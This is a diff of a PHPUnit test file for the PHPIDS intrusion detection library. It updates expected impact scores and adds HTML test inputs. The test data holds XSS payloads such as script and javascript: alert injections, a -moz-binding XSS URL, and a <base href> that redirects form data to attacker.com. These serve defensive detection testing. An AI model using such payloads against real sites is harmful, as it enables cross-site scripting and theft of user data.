@@ -552,7 +552,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(500, $result->getImpact());
+        $this->assertEquals(479, $result->getImpact());
     }
 
     public function testSQLIList2() {
@@ -611,7 +611,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(579, $result->getImpact());
+        $this->assertEquals(572, $result->getImpact());
     }
 
     public function testSQLIList3() {
@@ -655,7 +655,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(667, $result->getImpact());
+        $this->assertEquals(639, $result->getImpact());
     }
 
     public function testSQLIList4() {
@@ -715,7 +715,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(831, $result->getImpact());
+        $this->assertEquals(775, $result->getImpact());
     }
 
     public function testSQLIList5() {
@@ -1076,15 +1076,17 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
 						     </tr>
 						      </table><base href="http://attacker.com/collect.php" />';
         $exploits['html_4'] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
+        $exploits['html_5'] = '<img src="javascript:alert(1)">';
+        $exploits['html_6'] = '<script>alert(1)</script><h1>headline</h1><p>copytext</p>';
         
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
-        $test->setHtml(array('html_1', 'html_2', 'html_3'), 'html_4');
+        $test->setHtml(array('html_1', 'html_2', 'html_3', 'html_4', 'html_5', 'html_6'));
         $result = $test->run();
         $this->assertFalse($result->hasEvent(1));
-        $this->assertEquals(90, $result->getImpact());  	
+        $this->assertEquals(128, $result->getImpact());  	
     }
     
     public function testAllowedHTMLScanningNegative() {
@@ -1107,12 +1109,16 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                              </td>
                              </tr>
                              </table>';
+        $exploits['html_4'] = '<img src="http://www.google.de/" />';
+        $exploits['html_5'] = '<h1>headline</h1><p>copytext</p>
+                                    <p>bodytext &copy; 2008</p>     <h2>test
+                                    </h2>';
         
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
-        $test->setHtml(array('html_1', 'html_2', 'html_3'));
+        $test->setHtml(array('html_1', 'html_2', 'html_3', 'html_4', 'html_5'));
         $result = $test->run();
         $this->assertFalse($result->hasEvent(1));
         $this->assertEquals(0, $result->getImpact());   
